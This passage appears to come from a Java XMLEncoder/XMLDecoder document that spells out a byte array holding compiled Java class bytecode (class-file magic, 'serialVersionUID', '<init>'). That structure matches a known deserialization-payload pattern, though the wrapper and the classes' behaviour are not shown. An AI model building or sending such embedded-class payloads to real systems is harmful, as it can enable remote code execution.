index="5527"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5529"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5531"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5533"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5535"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5539"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5541"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5543"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5547"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5548"&gt;&lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="5549"&gt;&lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5551"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5552"&gt;&lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5556"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5558"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="5562"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5564"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5568"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="5570"&gt;&lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="5574"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5576"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5580"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5582"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="5584"&gt;&lt;byte&gt;-111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5588"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5590"&gt;&lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="5592"&gt;&lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="5594"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5596"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5600"&gt;&lt;byte&gt;63&lt;/byte&gt;&lt;/void&gt;&lt;void index="5604"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5608"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5609"&gt;&lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5613"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5615"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="5619"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5621"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5625"&gt;&lt;byte&gt;93&lt;/byte&gt;&lt;/void&gt;&lt;void index="5627"&gt;&lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="5631"&gt;&lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="5633"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5637"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5639"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="5641"&gt;&lt;byte&gt;-111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5647"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5649"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="5651"&gt;&lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="5653"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5657"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5659"&gt;&lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="5661"&gt;&lt;byte&gt;24&lt;/byte&gt;&lt;/void&gt;&lt;void index="5663"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5665"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5669"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5671"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5673"&gt;&lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="5675"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5677"&gt;&lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="5679"&gt;&lt;byte&gt;27&lt;/byte&gt;&lt;/void&gt;&lt;void index="5681"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5683"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5687"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5691"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5695"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5696"&gt;&lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5700"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5702"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="5706"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5708"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5712"&gt;&lt;byte&gt;96&lt;/byte&gt;&lt;/void&gt;&lt;void index="5714"&gt;&lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="5718"&gt;&lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="5720"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5724"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5726"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="5728"&gt;&lt;byte&gt;-111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5734"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5736"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="5738"&gt;&lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="5740"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5744"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5746"&gt;&lt;byte&gt;28&lt;/byte&gt;&lt;/void&gt;&lt;void index="5748"&gt;&lt;byte&gt;29&lt;/byte&gt;&lt;/void&gt;&lt;void index="5750"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5754"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5756"&gt;&lt;byte&gt;30&lt;/byte&gt;&lt;/void&gt;&lt;void index="5758"&gt;&lt;byte&gt;31&lt;/byte&gt;&lt;/void&gt;&lt;void index="5760"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5762"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5766"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5768"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5770"&gt;&lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="5772"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5774"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5776"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5778"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5780"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5784"&gt;&lt;byte&gt;-77&lt;/byte&gt;&lt;/void&gt;&lt;void index="5786"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5788"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5792"&gt;&lt;byte&gt;-98&lt;/byte&gt;&lt;/void&gt;&lt;void index="5793"&gt;&lt;byte&gt;-89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5795"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5796"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5797"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5798"&gt;&lt;byte&gt;-72&lt;/byte&gt;&lt;/void&gt;&lt;void index="5800"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5801"&gt;&lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5803"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5804"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5806"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5807"&gt;&lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5809"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="5810"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5811"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="5812"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5814"&gt;&lt;byte&gt;61&lt;/byte&gt;&lt;/void&gt;&lt;void index="5815"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="5816"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5817"&gt;&lt;byte&gt;63&lt;/byte&gt;&lt;/void&gt;&lt;void index="5818"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="5819"&gt;&lt;byte&gt;-69&lt;/byte&gt;&lt;/void&gt;&lt;void index="5821"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="5822"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5823"&gt;&lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5825"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="5826"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5827"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5828"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5829"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5830"&gt;&lt;byte&gt;45&lt;/byte&gt;&lt;/void&gt;&lt;void index="5831"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5833"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="5834"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5835"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5836"&gt;&lt;byte&gt;-69&lt;/byte&gt;&lt;/void&gt;&lt;void index="5838"&gt;&lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5839"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5840"&gt;&lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5842"&gt;&lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="5843"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5844"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5845"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5846"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5847"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5848"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="5849"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5850"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5851"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5853"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="5854"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5855"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5856"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5857"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5858"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5859"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5860"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5861"&gt;&lt;byte&gt;-67&lt;/byte&gt;&lt;/void&gt;&lt;void index="5863"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="5864"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5865"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5866"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5867"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="5868"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5869"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5871"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="5872"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5873"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5874"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5875"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5876"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5877"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5878"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5880"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="5881"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5882"&gt;&lt;byte&gt;-67&lt;/byte&gt;&lt;/void&gt;&lt;void index="5884"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5885"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5886"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5887"&gt;&lt;byte&gt;44&lt;/byte&gt;&lt;/void&gt;&lt;void index="5888"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5889"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5891"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5892"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5893"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="5894"&gt;&lt;byte&gt;-72&lt;/byte&gt;&lt;/void&gt;&lt;void index="5896"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5897"&gt;&lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5899"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5900"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5902"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5903"&gt;&lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5905"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="5906"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5908"&gt;&lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="5909"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5910"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5911"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5912"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5913"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5915"&gt;&lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="5916"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5917"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5918"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5919"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5920"&gt;&lt;byte&gt;-69&lt;/byte&gt;&lt;/void&gt;&lt;void index="5922"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5923"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5924"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5925"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="5926"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5928"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5929"&gt;&lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5931"&gt;&lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="5932"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5934"&gt;&lt;byte&gt;-128&lt;/byte&gt;&lt;/void&gt;&lt;void index="5935"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5936"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5937"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5939"&gt;&lt;byte&gt;-125&lt;/byte&gt;&lt;/void&gt;&lt;void index="5940"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5941"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5942"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5944"&gt;&lt;byte&gt;-121&lt;/byte&gt;&lt;/void&gt;&lt;void index="5945"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5946"&gt;&lt;byte&gt;-119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5947"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5949"&gt;&lt;byte&gt;-114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5950"&gt;&lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5954"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5956"&gt;&lt;byte&gt;-113&lt;/byte&gt;&lt;/void&gt;&lt;void index="5960"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5962"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5963"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5965"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5967"&gt;&lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="5971"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5973"&gt;&lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="5975"&gt;&lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="5979"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5981"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5983"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5985"&gt;&lt;byte&gt;35&lt;/byte&gt;&lt;/void&gt;&lt;void index="5987"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="5989"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="5990"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5991"&gt;&lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="5993"&gt;&lt;byte&gt;126&lt;/byte&gt;&lt;/void&gt;&lt;void index="5995"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5998"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5999"&gt;&lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6000"&gt;&lt;byte&gt;-54&lt;/byte&gt;&lt;/void&gt;&lt;void index="6001"&gt;&lt;byte&gt;-2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6002"&gt;&lt;byte&gt;-70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6003"&gt;&lt;byte&gt;-66&lt;/byte&gt;&lt;/void&gt;&lt;void index="6007"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6009"&gt;&lt;byte&gt;27&lt;/byte&gt;&lt;/void&gt;&lt;void index="6010"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6012"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6014"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="6015"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6017"&gt;&lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="6018"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6020"&gt;&lt;byte&gt;24&lt;/byte&gt;&lt;/void&gt;&lt;void index="6021"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6023"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="6024"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6026"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6027"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6028"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6029"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6030"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6031"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6032"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6033"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6034"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6035"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6036"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6037"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6038"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6039"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6040"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="6041"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6042"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="6043"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6045"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6046"&gt;&lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6047"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6049"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="6050"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6051"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6052"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6053"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6054"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6055"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6056"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6057"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6058"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6059"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6060"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6061"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6062"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6063"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6064"&gt;&lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="6065"&gt;&lt;byte&gt;-26&lt;/byte&gt;&lt;/void&gt;&lt;void index="6066"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6067"&gt;&lt;byte&gt;-18&lt;/byte&gt;&lt;/void&gt;&lt;void index="6068"&gt;&lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="6069"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6070"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6071"&gt;&lt;byte&gt;24&lt;/byte&gt;&lt;/void&gt;&lt;void index="6072"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6074"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="6075"&gt;&lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="6076"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6077"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6078"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6079"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6080"&gt;&lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="6081"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6083"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6084"&gt;&lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="6085"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="6086"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void 